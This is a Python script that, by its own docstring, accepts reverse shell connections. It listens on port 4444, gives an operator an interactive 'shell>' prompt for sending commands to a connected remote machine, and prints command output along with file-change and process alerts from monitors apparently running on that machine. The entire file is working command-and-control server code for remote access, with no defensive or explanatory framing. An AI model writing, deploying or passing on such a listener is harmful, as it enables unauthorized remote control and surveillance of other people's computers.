#!/usr/bin/env python3
"""
listener_monitor.py
Accepts reverse shell connection and separates ALERT messages from command results.
"""

import socket
import threading
import json
import select

LISTEN_PORT = 4444
HOST = ""  # bind all

def client_handler(conn, addr):
    print(f"[+] Connection from {addr}")
    conn_file = conn.makefile('rb')
    # background thread to receive messages and print
    def receiver():
        buffer = b""
        while True:
            try:
                ready, _, _ = select.select([conn], [], [], 0.5)
                if not ready:
                    continue
                data = conn.recv(4096)
                if not data:
                    print("[*] Connection closed by remote")
                    break
                buffer += data
                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    try:
                        text = line.decode()
                    except Exception:
                        continue
                    # ALERT||JSON  or {"type":"cmd_result", ...}
                    if text.startswith("ALERT||"):
                        try:
                            payload = json.loads(text.split("ALERT||",1)[1])
                            print_alert(payload)
                        except Exception:
                            print("[!] Malformed alert:", text)
                    else:
                        # assume JSON cmd_result or fallback to raw
                        try:
                            obj = json.loads(text)
                            if isinstance(obj, dict) and obj.get("type") == "cmd_result":
                                print_cmd_result(obj)
                            else:
                                print("[?] Received JSON:", obj)
                        except json.JSONDecodeError:
                            print(text)
            except Exception as e:
                print("[!] Receiver error:", e)
                break

    threading.Thread(target=receiver, daemon=True).start()

    try:
        # interactive sender loop
        while True:
            cmd = input("shell> ").strip()
            if cmd == "":
                continue
            if cmd.lower() in ("exit","quit"):
                try:
                    conn.sendall(cmd.encode())
                except Exception:
                    pass
                break
            try:
                conn.sendall(cmd.encode())
            except Exception as e:
                print("[!] Send failed:", e)
                break
    except KeyboardInterrupt:
        pass
    finally:
        conn.close()
        print("[*] Connection handler terminating")

def print_alert(alert):
    m = alert.get("monitor","unknown")
    ts = alert.get("timestamp", "")
    if m == "inotify":
        print(f"\n--- ALERT (inotify) {ts} ---")
        print(f"{alert.get('event')}  {alert.get('path')}{alert.get('file')}")
        print("---------------------------")
    elif m == "process":
        print(f"\n--- ALERT (process) {ts} ---")
        if alert.get("added"):
            print("Added processes:")
            for p in alert["added"]:
                print(f" + pid={p['pid']} name={p['name']} user={p['user']}")
        if alert.get("removed"):
            print("Removed processes:")
            for p in alert["removed"]:
                print(f" - pid={p['pid']} name={p['name']} user={p['user']}")
        print("---------------------------")
    else:
        print(f"\n--- ALERT ({m}) ---")
        print(alert)
        print("---------------------------")

def print_cmd_result(obj):
    cmd = obj.get("cmd","")
    stdout = obj.get("stdout","")
    stderr = obj.get("stderr","")
    print(f"\n>>> CMD: {cmd}\n")
    if stdout:
        print(stdout, end="")
    if stderr:
        print(stderr, end="")
    print("\n")    

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, LISTEN_PORT))
    s.listen(1)
    print(f"[+] Listening on port {LISTEN_PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    main()
